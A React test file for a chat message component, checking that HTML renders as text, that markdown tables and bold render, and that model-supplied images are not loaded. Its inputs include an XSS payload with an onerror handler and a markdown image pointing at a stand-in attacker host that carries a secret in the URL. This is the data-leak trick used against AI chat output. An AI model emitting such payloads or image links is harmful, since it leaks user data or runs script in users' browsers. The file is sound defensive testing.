import { render, screen } from '@testing-library/react'
import MessageBubble from './MessageBubble'

describe('MessageBubble', () => {
  it('renders HTML as text', () => {
    const { container } = render(
      <MessageBubble role="assistant" content={'<img src=x onerror=alert(1)>'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(document.querySelector('img')).toBeNull()
  })

  it('renders markdown (GFM) for assistant replies', () => {
    render(
      <MessageBubble role="assistant" content={'**bold**\n\n| a | b |\n|---|---|\n| 1 | 2 |'} />,
    )
    expect(screen.getByText('bold').tagName).toBe('STRONG')
    expect(screen.getByRole('table')).toBeInTheDocument()
  })

  it('never renders model-provided images', () => {
    const { container } = render(
      <MessageBubble role="assistant" content={'![x](https://evil.example/p.png?d=secret)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByRole('link', { name: 'x' })
    expect(link).toHaveAttribute('href', 'https://evil.example/p.png?d=secret')
  })
})
